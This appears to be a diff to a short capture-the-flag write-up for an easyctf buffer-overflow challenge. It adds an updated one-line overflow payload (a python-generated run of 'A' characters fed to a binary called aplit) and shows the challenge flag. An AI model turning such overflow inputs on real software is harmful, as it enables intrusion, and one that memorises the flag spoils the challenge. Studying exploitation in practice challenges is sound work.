@@ -5,4 +5,8 @@ Playing around for a minute, I noticed that \x08 didn't cause
 a segfault, but did overwrite the int. No clue why, but it works.
 $ ./aplit $(python -c "print 'A'*708 + '\x08\x08\x08\x08\x08'")
 
+It appears the problem was immediately changed, so the \x08 is no longer
+required.
+$ ./aplit $(python -c "print 'A'*709")
+
 easyctf{essays_are_too_hard}
